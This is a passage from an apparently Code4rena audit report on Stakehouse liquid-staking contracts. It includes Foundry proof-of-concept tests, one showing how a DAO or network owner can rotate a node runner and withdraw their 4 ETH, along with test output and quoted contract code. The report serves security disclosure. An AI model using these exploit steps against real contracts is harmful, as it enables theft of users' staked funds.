data-index=\"83\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">forge</span><span class=\"mtk1\"> </span><span class=\"mtk12\">test</span><span class=\"mtk1\"> -</span><span class=\"mtk12\">vv</span><span class=\"mtk1\"> --</span><span class=\"mtk12\">match</span><span class=\"mtk1\"> </span><span class=\"mtk12\">testDaoRugFund_Pull_ERC20_Token_POC</span></span></span></code></pre>\n<p>the running result is</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"84\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">Running</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">test</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">test</span><span class=\"mtk1\">/</span><span class=\"mtk12\">foundry</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LiquidStakingManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">t</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk12\">LiquidStakingManagerTests</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[</span><span class=\"mtk12\">PASS</span><span class=\"mtk1\">] </span><span class=\"mtk11\">testDaoRugFund_Pull_ERC20_Token_POC</span><span class=\"mtk1\">() (</span><span class=\"mtk12\">gas</span><span class=\"mtk1\">: </span><span class=\"mtk7\">940775</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">Logs:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  wallet ERC20 token balance for user after registering</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  100000000000000000000</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  wallet ERC20 token balance for dao rugging</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">Test result: ok. 1 passed; 0 failed; finished in 16.99ms</span></span></span></code></pre>\n<h3 id=\"tools-used-18\" style=\"position:relative;\"><a href=\"#tools-used-18\" aria-label=\"tools used 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Manual Review, Foundry</p>\n<h3 id=\"recommended-mitigation-steps-28\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-28\" aria-label=\"recommended mitigation steps 28 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We recommend not give the dao admin the priviledge to perform arbitrary execution to access user’s fund.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/106#issuecomment-1329517252\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-09-dao-or-lsdn-owner-can-steal-funds-from-node-runner\" style=\"position:relative;\"><a href=\"#m-09-dao-or-lsdn-owner-can-steal-funds-from-node-runner\" aria-label=\"m 09 dao or lsdn owner can steal funds from node runner permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/109\">[M-09] DAO or lsdn owner can steal funds from node runner</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/109\">koxuan</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356-L377\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356-L377</a></p>\n<p>DAO or LSD network owner can swap node runner of the smart contract to their own eoa, allowing them to withdrawETH or claim rewards from node runner.</p>\n<h3 id=\"proof-of-concept-28\" style=\"position:relative;\"><a href=\"#proof-of-concept-28\" aria-label=\"proof of concept 28 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>There are no checks done when swapping the node runner whether there are funds in the smart contract that belongs to the node runner. Therefore, a malicious dao or lsd network owner can simply swap them out just right after the node runner has deposited 4 ether in the smart wallet.</p>\n<p>Place poc in LiquidStakingManager.sol</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"85\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testDaoCanTakeNodeRunner4ETH</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">accountOne</span><span class=\"mtk1\">; </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">, </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feesAndMevUser</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">accountTwo</span><span class=\"mtk1\">; </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">feesAndMevUser</span><span class=\"mtk1\">, </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">savETHUser</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">accountThree</span><span class=\"mtk1\">; </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">savETHUser</span><span class=\"mtk1\">, </span><span class=\"mtk7\">24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">attacker</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">accountFour</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">registerSingleBLSPubKey</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">blsPubKeyOne</span><span class=\"mtk1\">, </span><span class=\"mtk12\">accountFour</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">admin</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">rotateNodeRunnerOfSmartWallet</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_uint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">.</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdrawETHForKnot</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">,</span><span class=\"mtk12\">blsPubKeyOne</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_uint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">.</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"tools-used-19\" style=\"position:relative;\"><a href=\"#tools-used-19\" aria-label=\"tools used 19 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>forge</p>\n<h3 id=\"recommended-mitigation-steps-29\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-29\" aria-label=\"recommended mitigation steps 29 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Send back outstanding ETH and rewards that belongs to node runner if swapping is needed.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/109#issuecomment-1329514501\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-10--incorrect-implementation-of-the-ethpoollpfactorysolrotatelptokens-let-user-stakes-eth-more-than-maxstakingamountpervalidator-in-stakingfundsvault-and-dos-the-stake-function-in-liquidstakingmanager\" style=\"position:relative;\"><a href=\"#m-10--incorrect-implementation-of-the-ethpoollpfactorysolrotatelptokens-let-user-stakes-eth-more-than-maxstakingamountpervalidator-in-stakingfundsvault-and-dos-the-stake-function-in-liquidstakingmanager\" aria-label=\"m 10  incorrect implementation of the ethpoollpfactorysolrotatelptokens let user stakes eth more than maxstakingamountpervalidator in stakingfundsvault and dos the stake function in liquidstakingmanager permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/132\">[M-10]  Incorrect implementation of the <code>ETHPoolLPFactory.sol#rotateLPTokens</code> let user stakes ETH more than <code>maxStakingAmountPerValidator</code> in <code>StakingFundsVault</code>, and DOS the stake function in <code>LiquidStakingManager</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/132\">ladboy233</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/329\">immeas</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/326\">0xdeadbeef0x</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/295\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/271\">minhtrng</a>, and <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/118\">SaeedAlipoor01988</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L76\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L76</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L380\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L380</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L122\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L122</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L130\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L130</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L83\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L83</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L551\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L551</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L940\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L940</a></p>\n<p>The user is not able to stake the 32 ETH for validators because the staking fund vault LP total supply exceeds 4 ETHER.</p>\n<p>After the smart wallet, staking fund vault and savETH vault has 32 ETH, the user should be able to call:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"86\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @notice Anyone can call this to trigger staking once they have all of the required input params from BLS authentication</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param _blsPublicKeyOfKnots List of knots being staked with the Ethereum deposit contract (32 ETH sourced within the network)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param _ciphertexts List of backed up validator operations encrypted and stored to the Ethereum blockchain</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param _aesEncryptorKeys List of public identifiers of credentials that performed the trustless backup</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param _encryptionSignatures List of EIP712 signatures attesting to the correctness of the BLS signature</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param _dataRoots List of serialized SSZ containers of the DepositData message for each validator used by Ethereum deposit contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">stake</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_blsPublicKeyOfKnots</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_ciphertexts</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_aesEncryptorKeys</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\tIDataStructures.EIP712Signature[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_encryptionSignatures</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_dataRoots</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>before the staking, the validation function is called:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"87\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// check minimum balance of smart wallet, dao staking fund vault and savETH vault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_assertEtherIsReadyForValidatorStaking</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKey</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>which calls:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"88\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @dev Check the savETH vault, staking funds vault and node runner smart wallet to ensure 32 ether required for staking has been achieved</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_assertEtherIsReadyForValidatorStaking</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">blsPubKey</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">associatedSmartWallet</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">smartWalletOfKnot</span><span class=\"mtk1\">[</span><span class=\"mtk12\">blsPubKey</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">associatedSmartWallet</span><span class=\"mtk1\">.</span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Smart wallet balance must be at least 4 ether&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">LPToken</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stakingFundsLP</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">stakingFundsVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">lpTokenForKnot</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKey</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stakingFundsLP</span><span class=\"mtk1\">) != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;No funds staked in staking funds vault&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stakingFundsLP</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() == </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;DAO staking funds vault balance must be at least 4 ether&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">LPToken</span><span class=\"mtk1\"> </span><span class=\"mtk12\">savETHVaultLP</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">savETHVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">lpTokenForKnot</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKey</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">savETHVaultLP</span><span class=\"mtk1\">) != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;No funds staked in savETH vault&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">savETHVaultLP</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() == </span><span class=\"mtk7\">24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;KNOT must have 24 ETH in savETH vault&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>note that the code requires the total supply of the stakingFundsLP to be equal to 4 ETHER</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"89\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stakingFundsLP</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() == </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span 